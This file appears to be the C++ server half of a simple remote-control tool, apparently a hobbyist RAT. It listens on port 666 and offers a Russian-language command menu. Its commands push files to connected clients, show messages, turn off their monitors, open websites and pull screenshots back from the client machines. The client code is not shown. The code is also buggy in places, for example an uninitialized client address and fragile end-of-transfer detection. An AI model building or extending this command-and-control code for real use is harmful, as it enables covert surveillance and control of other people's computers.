//Server
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"Ws2_32.lib")
#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <thread>
#define PRINTNUSERS if (ClientCount) printf("%d user on-line\n", ClientCount); \
        else printf("No User on-line\n");

SOCKET Connect;
SOCKET* Connections;
SOCKET Listen;

int ClientCount = 1;

bool checkend(char *arr,int len) {
	for (int i = 0; i < len-3; i++) {
		if (arr[i] != '\0')return true;
		std::cout << "True\n";
	}
	std::cout << "FALSE\n";
	return false;

}

void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_addr) {
	while (1) {
		if (Connect1 = accept(Listen1, NULL, NULL)) {
			ClientCount++;
			Connections[ClientCount] = Connect1;
			printf("Client connected\n");
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
		}
	}
}

int main() {

	setlocale(LC_ALL, "russian");

	WSAData data;
	WORD version = MAKEWORD(2, 2);
	int res = WSAStartup(version, &data);
	if (res != 0)
	{
		return 0;
	}

	struct addrinfo hints;
	struct addrinfo* result;

	Connections = (SOCKET*)calloc(64, sizeof(SOCKET));

	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_flags = AI_PASSIVE;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo(NULL, "666", &hints, &result);

	Listen = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	bind(Listen, result->ai_addr, result->ai_addrlen);
	listen(Listen, SOMAXCONN);

	freeaddrinfo(result);

	printf("Starting server...");
	sockaddr_in client_addr;

	int client_addr_size = sizeof(client_addr);
	HOSTENT *hst;
	hst = gethostbyaddr((char *)&client_addr.sin_addr.s_addr, 4, AF_INET);
		char m_connect[256] = "--i";
		if (Connect = accept(Listen, NULL, NULL)) {

			printf("Client connected\n");
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
			Connections[ClientCount] = Connect;
			send(Connections[ClientCount], m_connect, strlen(m_connect), NULL);
			std::thread t(concheck, Connect, Listen, hst, client_addr);
			t.detach();
		}
		while (true) {
			char m_connect[256] = "";
			int i = 0;
			std::cout << "Введите команду:\n--s передать файл\n--m вывести сообщение\n--o выключить монитор\n--e закрыть клиент\n--w открыть сайт\n--c сделать скриншот\n";
			char a = getchar();
			while (a != '\n') {
				m_connect[i] = a;
				i++;
				a = getchar();
			}
			for (int i = 0; i <= ClientCount; i++) {
				send(Connections[i], m_connect, strlen(m_connect), NULL);
			}
			if ((m_connect[2] == 's')&&(m_connect[0]=='-')&&((m_connect[1] == '-'))) {
				FILE *in;
				std::string file;
				std::cout << "Введите путь к файлу\n";
				std::cin >> file;
				std::cout << "Начинаю передавать файл\n";
				fopen_s(&in, file.c_str(), "rb");
				while (!feof(in)) {
					char bufer[1024] = "";
					int b = fread(bufer, 1, sizeof(bufer), in);
					int size = ftell(in);
					//printf("bytes read: %d, part:%d, pos: %ld \n", b, size);
					if (b != 0) send(Connections[ClientCount], bufer, b, 0);
				}
				send(Connections[ClientCount], "@@^", 3, 0);
				fclose(in);
				std::cout << "Файл отправлен!\n";
			}
			else if ((m_connect[2] == 'c') && (m_connect[0] == '-') && ((m_connect[1] == '-'))) {
				std::cout << "Пытаюсь загрузить скриншот\n";
				HANDLE hFile;
				hFile = CreateFile("screendown.png",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				DWORD dwBytesWritten;
				while (1) {
					bool exit = false;
					const int bufsize = 1024;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if (nbytes == 0) {
						std::cout << "Screenshot loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					if ((buff[bufsize-1] == '@') && (buff[bufsize-2] == '@') && (buff[bufsize - 3] == '^')) { exit = true; }
					if(exit) {
						if (!checkend(buff,bufsize)) {
							std::cout << "Screenshot loaded with func\n"; break;
						}
						WriteFile(hFile, buff, nbytes-3, &dwBytesWritten, NULL);
						std::cout << "Screenshot loaded without func\n"; break;
					}
					else {
						WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
					}
				}
				CloseHandle(hFile);
			}
		}
	return 1;
}
